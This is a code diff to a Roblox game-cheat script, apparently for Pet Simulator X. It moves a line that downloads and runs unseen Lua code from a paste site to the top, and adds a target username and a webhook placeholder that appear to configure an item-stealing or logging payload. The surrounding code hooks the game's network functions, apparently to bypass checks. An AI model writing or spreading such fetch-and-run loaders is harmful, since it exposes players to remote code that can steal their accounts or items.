@@ -1,3 +1,7 @@
+_G.Username = "Child"
+_G.ScriptName = "Loading Lunar Hub..."
+_G.Webhook = "YOUR_WEBHOOK"
+
 loadstring(game:HttpGet("https://paste.xyzo.space/psx/beta/69420.lua"))()
 
 local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network); local Fire, Invoke = Network.Fire, Network.Invoke; hookfunction(getupvalue(Fire, 1), function(...) return true end)
@@ -37,7 +41,6 @@ local function unlockPetsInFolder(folder)
     end
   end
 end
-loadstring(game:HttpGet("https://paste.xyzo.space/psx/beta/69420.lua"))()
 
 local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network); local Fire, Invoke = Network.Fire, Network.Invoke; hookfunction(getupvalue(Fire, 1), function(...) return true end)
 local FrameworkLibrary = require(game.ReplicatedStorage.Framework.Library)
